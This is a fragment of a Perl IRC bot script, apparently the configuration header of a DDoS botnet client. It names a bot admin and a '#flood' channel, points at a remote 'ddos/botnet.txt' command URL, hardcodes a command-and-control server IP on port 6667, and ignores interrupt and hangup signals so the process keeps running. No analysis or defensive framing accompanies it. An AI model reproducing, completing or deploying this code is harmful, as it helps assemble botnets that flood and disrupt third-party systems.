...
my $linas_max='3';
my $sleep='2';
my $cmd="http://www.ccpn.mx/archive/ddos/botnet.txt";
my $id="http://www.ccpn.mx/archive/ddos/botnet.txt";
############################################
my @adms=("dean");
my @canais=("#flood");
...
#Nickname of bot 
my $ircname ='.';
chop (my $realname = 'cMd');
#IRC name and Realname 
$servidor='46.251.228.233' unless $servidor;
my $porta='6667'; 
############################################
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
